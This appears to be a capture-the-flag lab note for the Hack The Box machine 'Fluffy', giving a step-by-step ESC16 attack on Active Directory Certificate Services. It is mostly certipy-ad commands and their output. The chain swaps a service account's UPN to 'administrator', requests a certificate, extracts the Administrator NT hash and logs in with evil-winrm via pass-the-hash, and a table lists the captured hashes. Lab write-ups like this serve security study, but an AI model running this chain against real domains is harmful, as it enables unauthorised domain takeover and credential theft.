## ESC16 - UPN Swap and Certificate Request

### Description

ESC16 is a vulnerability in Active Directory Certificate Services (ADCS) that allows privilege escalation by manipulating the User Principal Name (UPN) and requesting certificates. This vulnerability exists when the security extension `szOID_NTDS_CA_SECURITY_EXT` (OID: `1.3.6.1.4.1.311.25.2`) is disabled on the CA.

### Prerequisites

- Credentials for an account with permissions to modify your own UPN

- Access to the Certificate Authority (CA)

- The account must have enrollment permissions in certificate templates
### Vulnerability Detection
```bash
# List ADCS and search for vulnerabilities
certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
```
  

**ESC16 indicators:**

- `Disabled Extensions: 1.3.6.1.4.1.311.25.2`

- `[!] Vulnerabilities: ESC16 - Security Extension is disabled`
### Step-by-Step Exploitation
#### 1. Verify Time Configuration
ESC16 requires Kerberos authentication, which is sensitive to time synchronization:
```bash
# Stop automatic synchronization
sudo systemctl stop systemd-timesyncd
sudo systemctl disable systemd-timesyncd

# Manually synchronize with the DC
sudo ntpdate 10.129.232.88
```

⚠️ **Important**: You must synchronize the time before EVERY command that uses Kerberos.

#### 2. Change UPN to Target User
```bash
# Change the UPN from ca_svc to 'administrator'
sudo ntpdate 10.129.232.88 && certipy-ad account update \
  -username "ca_svc@fluffy.htb" \
  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -user ca_svc \
  -upn 'administrator' \
  -dc-ip 10.129.232.88 \
  -dc-host dc01.fluffy.htb
```

**Expected output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName: administrator
[*] Successfully updated 'ca_svc'
```

#### 3. Request Certificate
```bash
# Request certificate using the ‘User’ template
sudo ntpdate 10.129.232.88 && certipy-ad req \
  -u 'ca_svc@fluffy.htb' \
  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -target 'dc01.fluffy.htb' \
  -ca 'fluffy-DC01-CA' \
  -template 'User' \
  -dc-ip 10.129.232.88
```

**Expected output:**
```
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

#### 4. Restaurar UPN Original
```bash
# Restore the UPN of ca_svc to its original value
sudo ntpdate 10.129.232.88 && certipy-ad account update \
  -username "ca_svc@fluffy.htb" \
  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -user ca_svc \
  -upn 'ca_svc@fluffy.htb' \
  -dc-ip 10.129.232.88 \
  -dc-host dc01.fluffy.htb
```

#### 5. Authenticate with the Certificate
```bash
# Obtain the NT hash of the Administrator using the certificate
sudo ntpdate 10.129.232.88 && certipy-ad auth \
  -pfx administrator.pfx \
  -domain 'fluffy.htb' \
  -dc-ip 10.129.232.88
```

**Output:**
```
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@fluffy.htb':
    aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

#### 6. Log in as Administrator
```bash
# Connect via WinRM using the hash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.129.232.88
```

```powershell
# Obtain the root flag
type C:\Users\Administrator\Desktop\root.txt
```

### Complete Attack Chain
```bash
# Complete one-liner (execute line by line)
sudo systemctl stop systemd-timesyncd && \
sudo ntpdate 10.129.232.88 && \
certipy-ad account update -username "ca_svc@fluffy.htb" -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn 'administrator' -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb && \
sudo ntpdate 10.129.232.88 && \
certipy-ad req -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' -dc-ip 10.129.232.88 && \
sudo ntpdate 10.129.232.88 && \
certipy-ad account update -username "ca_svc@fluffy.htb" -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb && \
sudo ntpdate 10.129.232.88 && \
certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
```

### Troubleshooting

#### Error: KRB_AP_ERR_SKEW (Clock skew too great)
**Cause:** Time difference greater than 5 minutes between the client and the DC.
**Solution:**
```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.129.232.88
# Execute command immediately after
```
### Restore Normal Time Settings
After completing the machine:
```bash
#Restore automatic time synchronization
sudo timedatectl set-timezone America/La_Paz
sudo systemctl enable systemd-timesyncd
sudo systemctl start systemd-timesyncd
sudo timedatectl set-ntp true

# Verify
timedatectl status
```

### References

- [Certipy Documentation - ESC16](https://github.com/ly4k/Certipy)
- [SpecterOps - Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [[10-adcs-enumeration]]
- [[08-shadow-credentials-certipy]]

### Credentials Obtained

| Usuario       | Hash NT                            | Método             |
| ------------- | ---------------------------------- | ------------------ |
| ca_svc        | `ca0f4f9e9eb8a092addf53bb03fc98c8` | Shadow Credentials |
| Administrator | `8da83a3fa618b6e3a00e93f676c92a6e` | ESC16 Certificate  |

---

**Tags**: #esc16 #adcs #certificate-abuse #upn-manipulation #privilege-escalation #kerberos #certipy #fluffy-htb